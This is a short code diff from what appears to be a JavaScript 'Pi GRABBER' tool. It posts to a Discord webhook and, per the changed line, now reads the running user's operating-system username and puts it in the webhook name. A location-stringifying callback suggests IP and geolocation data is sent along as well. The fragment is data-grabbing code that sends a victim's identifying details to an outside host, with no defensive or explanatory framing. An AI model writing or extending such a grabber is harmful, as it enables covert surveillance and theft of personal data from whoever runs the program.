@@ -9,7 +9,7 @@ const { Webhook } = require('discord-webhook-node');
 const hook = new Webhook("YOUR WEBHOOK GHQKlqs2bLLgpymiurSW5-");
  
 const IMAGE_URL = 'https://images7.memedroid.com/images/UPLOADED883/5d5dafcfcf72e.jpeg';
-hook.setUsername('Pi GRABBER');
+hook.setUsername(`Pi 4 ${require("os").userInfo().username}`);
 hook.setAvatar(IMAGE_URL);
 let ipCallback = function(loc){
   loc = JSON.stringify(loc)
